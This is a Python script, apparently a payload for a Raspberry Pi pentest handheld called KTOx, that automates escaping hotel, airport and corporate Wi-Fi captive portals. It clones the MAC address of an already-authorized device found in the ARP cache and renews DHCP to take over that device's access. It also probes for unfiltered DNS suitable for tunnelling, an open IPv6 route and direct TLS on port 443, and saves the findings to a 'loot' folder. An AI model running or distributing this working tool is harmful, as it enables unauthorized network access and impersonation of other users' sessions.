#!/usr/bin/env python3
"""
KTOx payload — Captive Portal Escape
======================================
Multi-technique bypass toolkit for captive portals (hotel, airport,
corporate Wi-Fi). Runs each technique and reports whether it opened a
path through. Results are saved to /root/KTOx/loot/PortalEscape/.

Techniques
----------
  1  MAC Clone    — ARP-scan LAN, clone an authorized device's MAC,
                    reconnect and request a fresh DHCP lease.
  2  DNS Probe    — Resolve known hosts via 8.8.8.8 directly; if it
                    works, DNS is unfiltered (iodine / dns2tcp viable).
  3  IPv6 Escape  — Enable IPv6, check for external reachability;
                    many portals only filter IPv4.
  4  HTTPS Bypass — Try direct TLS to 1.1.1.1:443 and check the
                    response isn't portal HTML.

Controls
--------
  UP / DOWN   navigate technique list
  KEY1        run selected technique
  KEY2        run all techniques in sequence
  KEY3        exit

Author: wickednull
"""

import os, sys, time, subprocess, socket, re
from datetime import datetime
from pathlib import Path

# ── path setup ────────────────────────────────────────────────────────────────
sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..")))
if "/root/KTOx" not in sys.path:
    sys.path.insert(0, "/root/KTOx")

try:
    import RPi.GPIO as GPIO
    import LCD_1in44, LCD_Config
    from PIL import Image, ImageDraw, ImageFont
    HAS_HW = True
except ImportError:
    HAS_HW = False

from _input_helper import get_button, flush_input

# ── constants ─────────────────────────────────────────────────────────────────
PINS = {"UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
        "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16}
W, H = 128, 128

LOOT_DIR = Path("/root/KTOx/loot/PortalEscape")
IFACE    = "wlan0"    # interface to operate on

# ── Game Boy DMG colour palette ───────────────────────────────────────────────
GB_BG    = "#0f380f"
GB_DARK  = "#306230"
GB_MID   = "#8bac0f"
GB_LIGHT = "#9bbc0f"
GB_WHITE = "#e0f8d0"
GB_ERR   = "#7a1a1a"
GB_ERRT  = "#c04040"

# ── LCD helpers ───────────────────────────────────────────────────────────────

def _font(size=8):
    try:
        return ImageFont.truetype(
            "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf", size)
    except Exception:
        return ImageFont.load_default()

FONT_SM = _font(8)
FONT_MD = _font(9)

lcd_hw = None

if HAS_HW:
    try:
        GPIO.setmode(GPIO.BCM)
        GPIO.setwarnings(False)
        for _p in PINS.values():
            GPIO.setup(_p, GPIO.IN, pull_up_down=GPIO.PUD_UP)
        lcd_hw = LCD_1in44.LCD()
        lcd_hw.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
        lcd_hw.LCD_Clear()
    except Exception as _e:
        print(f"LCD init: {_e}")


def _push(img):
    if lcd_hw:
        try:
            lcd_hw.LCD_ShowImage(img, 0, 0)
        except Exception:
            pass


def lcd_status(title, lines, tc=None, lc=None):
    tc = tc or GB_DARK
    lc = lc or GB_WHITE
    img  = Image.new("RGB", (W, H), GB_BG)
    draw = ImageDraw.Draw(img)
    draw.rectangle((0, 0, W, 14), fill=tc)
    draw.text((3, 2), title[:20], fill=GB_WHITE, font=FONT_MD)
    y = 18
    for ln in (lines or []):
        draw.text((3, y), str(ln)[:21], fill=lc, font=FONT_SM)
        y += 11
        if y > H - 8:
            break
    _push(img)
    if not HAS_HW:
        print(f"[{title}]", *lines)


# ── technique definitions ─────────────────────────────────────────────────────
# status: "?" untested  "OK" bypass found  "X" blocked  "~" partial
TECHNIQUES = [
    {"id": "mac",   "name": "MAC Clone",    "status": "?", "detail": ""},
    {"id": "dns",   "name": "DNS Probe",    "status": "?", "detail": ""},
    {"id": "ipv6",  "name": "IPv6 Escape",  "status": "?", "detail": ""},
    {"id": "https", "name": "HTTPS Bypass", "status": "?", "detail": ""},
]


# ── helpers ───────────────────────────────────────────────────────────────────

def _run(cmd, timeout=10):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True,
                           text=True, timeout=timeout)
        return (r.stdout + r.stderr).strip()
    except Exception as e:
        return str(e)


def _internet_ok():
    """Quick check: can we reach 1.1.1.1:80 and get a non-portal response?"""
    try:
        s = socket.create_connection(("1.1.1.1", 80), timeout=5)
        s.sendall(b"GET / HTTP/1.0\r\nHost: 1.1.1.1\r\n\r\n")
        data = s.recv(512).decode("utf-8", "ignore")
        s.close()
        # Portal pages redirect; real Cloudflare returns 400 or 301, not portal HTML
        return "captive" not in data.lower() and "portal" not in data.lower()
    except Exception:
        return False


def _save_result(tech_name, lines):
    LOOT_DIR.mkdir(parents=True, exist_ok=True)
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = LOOT_DIR / f"{tech_name}_{ts}.txt"
    try:
        with open(path, "w") as f:
            f.write("\n".join(lines) + "\n")
    except Exception:
        pass


# ── techniques ────────────────────────────────────────────────────────────────

def run_mac_clone():
    lcd_status("MAC CLONE", ["Scanning ARP table...", "Finding LAN hosts..."])

    # Collect neighbours from ARP cache (these are hosts we've spoken to —
    # likely already authorized on the portal)
    out   = _run("ip neigh show")
    macs  = re.findall(r"lladdr\s+([0-9a-f:]{17})", out, re.I)
    # Also try arp -a as fallback
    if not macs:
        out2 = _run("arp -a")
        macs = re.findall(r"([0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2})",
                          out2, re.I)

    # Filter out broadcast/multicast
    macs = [m for m in macs if not m.startswith(("ff:", "01:", "33:"))]

    lines = []
    if not macs:
        lines = ["No ARP neighbors found.", "Connect to AP first,", "then retry."]
        return "X", lines

    target = macs[0]
    lcd_status("MAC CLONE", [f"Target: {target}", "Cloning..."])

    _run(f"ip link set {IFACE} down")
    _run(f"ip link set {IFACE} address {target}")
    _run(f"ip link set {IFACE} up")
    time.sleep(1)

    # Request fresh DHCP lease
    _run(f"dhclient -r {IFACE} 2>/dev/null; dhclient {IFACE} 2>/dev/null", timeout=15)
    time.sleep(2)

    if _internet_ok():
        lines = [f"Cloned: {target}", "DHCP OK.", "Internet OPEN!"]
        status = "OK"
    else:
        lines = [f"Cloned: {target}", "No internet yet.", "Portal may check", "user-agent or cookie."]
        status = "~"

    _save_result("mac_clone", [f"Interface: {IFACE}", f"Cloned MAC: {target}"] + lines)
    return status, lines


def run_dns_probe():
    lcd_status("DNS PROBE", ["Querying 8.8.8.8...", "Bypassing local DNS..."])

    lines = []

    # Query Google's DNS directly — if the portal intercepts DNS, this will
    # fail or return portal IP instead of real answer
    out = _run("dig +short @8.8.8.8 google.com A 2>/dev/null || "
               "nslookup google.com 8.8.8.8 2>/dev/null", timeout=8)

    real_ip_pattern = re.compile(r"\b(?!192\.|10\.|172\.|127\.)\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")
    hits = real_ip_pattern.findall(out)

    if hits:
        lines.append(f"DNS OK: {hits[0]}")
        lines.append("Direct DNS works!")
        lines.append("iodine/dns2tcp viable.")
        # Also test if raw UDP 53 to 8.8.8.8 gets through
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(4)
            # Minimal DNS query for 'a.root-servers.net'
            query = b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x01a\x0croot-servers\x03net\x00\x00\x01\x00\x01"
            s.sendto(query, ("8.8.8.8", 53))
            data, _ = s.recvfrom(512)
            s.close()
            lines.append("UDP port 53 OPEN.")
        except Exception:
            lines.append("UDP 53 blocked.")
        status = "OK"
    else:
        lines = ["DNS filtered.", "8.8.8.8 unreachable", "or hijacked.", "iodine unlikely."]
        status = "X"

    _save_result("dns_probe", lines)
    return status, lines


def run_ipv6_escape():
    lcd_status("IPv6 ESCAPE", ["Enabling IPv6...", "Checking routes..."])

    _run("sysctl -w net.ipv6.conf.all.disable_ipv6=0 2>/dev/null")
    _run("sysctl -w net.ipv6.conf.wlan0.disable_ipv6=0 2>/dev/null")
    time.sleep(1)

    # Check for a global IPv6 address (not link-local fe80::)
    addr_out = _run(f"ip -6 addr show {IFACE}")
    global_addrs = re.findall(r"inet6\s+([0-9a-f:]+)/\d+\s+scope global", addr_out, re.I)

    lines = []
    if not global_addrs:
        lines = ["No global IPv6 addr.", "AP may not offer IPv6.", "Try SLAAC:", "Connect longer."]
        _save_result("ipv6_escape", lines)
        return "X", lines

    lines.append(f"IPv6: {global_addrs[0][:19]}")

    # Ping Google's IPv6 DNS
    ping = _run("ping6 -c 2 -W 3 2001:4860:4860::8888 2>/dev/null", timeout=8)
    if "2 received" in ping or "1 received" in ping:
        lines.append("Ping6 SUCCESS!")
        lines.append("IPv6 internet open.")
        lines.append("Portal bypass ready.")
        status = "OK"
    else:
        lines.append("Ping6 failed.")
        lines.append("IPv6 addr exists but")
        lines.append("no external routing.")
        status = "~"

    _save_result("ipv6_escape", lines)
    return status, lines


def run_https_bypass():
    lcd_status("HTTPS BYPASS", ["Testing port 443...", "Direct IP connect..."])

    lines = []
    targets = [("1.1.1.1", 443), ("8.8.8.8", 443), ("9.9.9.9", 443)]

    for ip, port in targets:
        try:
            s = socket.create_connection((ip, port), timeout=5)
            # Attempt TLS ClientHello — if we get server data back, port is open
            s.sendall(b"\x16\x03\x01\x00\xa5\x01\x00\x00\xa1\x03\x03")
            data = s.recv(64)
            s.close()
            if data and data[0] == 0x16:  # TLS record type 22
                lines.append(f"TLS {ip}:443 OPEN!")
                lines.append("Port 443 not filtered.")
                lines.append("HTTPS bypass works.")
                status = "OK"
                _save_result("https_bypass", lines)
                return status, lines
            else:
                lines.append(f"{ip}:443 TCP open,")
                lines.append("but TLS intercepted.")
        except socket.timeout:
            lines.append(f"{ip}:443 TIMEOUT")
        except Exception:
            lines.append(f"{ip}:443 BLOCKED")

    # Fallback: check HTTP (captive portals usually allow 80 for redirect)
    try:
        s = socket.create_connection(("neverssl.com", 80), timeout=5)
        s.sendall(b"GET / HTTP/1.0\r\nHost: neverssl.com\r\n\r\n")
        resp = s.recv(256).decode("utf-8", "ignore")
        s.close()
        if "neverssl" in resp.lower():
            lines.append("HTTP open (unfiltered)")
            lines.append("but HTTPS blocked.")
            status = "~"
        else:
            lines.append("HTTP redirected to")
            lines.append("portal page.")
            status = "X"
    except Exception:
        lines.append("HTTP also blocked.")
        status = "X"

    _save_result("https_bypass", lines)
    return status, lines


RUNNERS = {
    "mac":   run_mac_clone,
    "dns":   run_dns_probe,
    "ipv6":  run_ipv6_escape,
    "https": run_https_bypass,
}


# ── menu rendering ────────────────────────────────────────────────────────────

STATUS_COL = {"OK": GB_LIGHT, "X": GB_ERRT, "~": GB_MID, "?": GB_MID}
STATUS_CHR = {"OK": "+", "X": "x", "~": "~", "?": "?"}

VISIBLE = 4


def render_menu(cursor):
    img  = Image.new("RGB", (W, H), GB_BG)
    draw = ImageDraw.Draw(img)

    draw.rectangle((0, 0, W, 14), fill=GB_DARK)
    draw.text((3, 2), "PORTAL ESCAPE", fill=GB_WHITE, font=FONT_MD)

    # Internet status badge
    ok = _internet_ok()
    badge_col = GB_LIGHT if ok else GB_ERRT
    badge_txt = "FREE" if ok else "CPTV"
    draw.text((90, 3), badge_txt, fill=badge_col, font=FONT_SM)

    y = 18
    scroll = max(0, cursor - VISIBLE + 1)
    for i in range(scroll, min(scroll + VISIBLE, len(TECHNIQUES))):
        t   = TECHNIQUES[i]
        sel = (i == cursor)
        sc  = STATUS_CHR[t["status"]]
        col = STATUS_COL[t["status"]]

        line = f"[{sc}] {t['name']}"
        if sel:
            draw.rectangle((0, y, W, y + 10), fill=GB_DARK)
            draw.text((3, y), line[:21], fill=GB_WHITE, font=FONT_SM)
        else:
            draw.text((3, y), line[:21], fill=col, font=FONT_SM)
        y += 12

    draw.line((0, H - 22, W, H - 22), fill=GB_DARK)
    draw.text((3, H - 20), "K1=run  K2=all  K3=exit", fill=GB_MID, font=FONT_SM)
    draw.text((3, H - 10), "+open  x=block  ~=partial", fill=GB_MID, font=FONT_SM)

    _push(img)
    if not HAS_HW:
        for i, t in enumerate(TECHNIQUES):
            sel = ">" if i == cursor else " "
            print(f"  {sel}[{STATUS_CHR[t['status']]}] {t['name']}")


def render_running(name):
    lcd_status("RUNNING", [name, "", "Please wait..."])


def render_result(tech, status, lines):
    col = GB_LIGHT if status == "OK" else (GB_ERRT if status == "X" else GB_MID)
    tc  = GB_DARK if status != "X" else GB_ERR
    lcd_status(tech["name"], lines, tc=tc, lc=col)


# ── main ──────────────────────────────────────────────────────────────────────

def run_technique(idx):
    tech   = TECHNIQUES[idx]
    render_running(tech["name"])
    runner = RUNNERS.get(tech["id"])
    if not runner:
        return
    try:
        status, lines = runner()
    except Exception as e:
        status, lines = "X", [str(e)[:40]]
    tech["status"] = status
    tech["detail"] = lines[0] if lines else ""
    render_result(tech, status, lines)


def main():
    flush_input()

    cursor   = 0
    last_btn = 0.0

    lcd_status("PORTAL ESCAPE", ["KTOx bypass toolkit", "", "KEY1=run  KEY2=all", "KEY3=exit"])
    time.sleep(1.5)
    render_menu(cursor)

    while True:
        now = time.monotonic()
        btn = get_button(PINS, GPIO) if HAS_HW else None

        if btn and (now - last_btn) > 0.22:
            last_btn = now

            if btn == "UP":
                cursor = max(0, cursor - 1)
                render_menu(cursor)

            elif btn == "DOWN":
                cursor = min(len(TECHNIQUES) - 1, cursor + 1)
                render_menu(cursor)

            elif btn == "KEY1":
                run_technique(cursor)
                time.sleep(4)
                render_menu(cursor)

            elif btn == "KEY2":
                for i in range(len(TECHNIQUES)):
                    cursor = i
                    render_menu(cursor)
                    run_technique(i)
                    time.sleep(2)
                render_menu(cursor)

            elif btn == "KEY3":
                break

        time.sleep(0.05)

    # Summary
    opened = [t for t in TECHNIQUES if t["status"] == "OK"]
    if opened:
        lcd_status("SUMMARY",
                   [f"{len(opened)} bypass(es) found:"] +
                   [f"  + {t['name']}" for t in opened],
                   lc=GB_LIGHT)
    else:
        lcd_status("SUMMARY", ["No bypasses found.", "Portal is well locked."],
                   tc=GB_ERR, lc=GB_ERRT)
    time.sleep(3)

    if HAS_HW:
        try:
            GPIO.cleanup()
        except Exception:
            pass


if __name__ == "__main__":
    main()
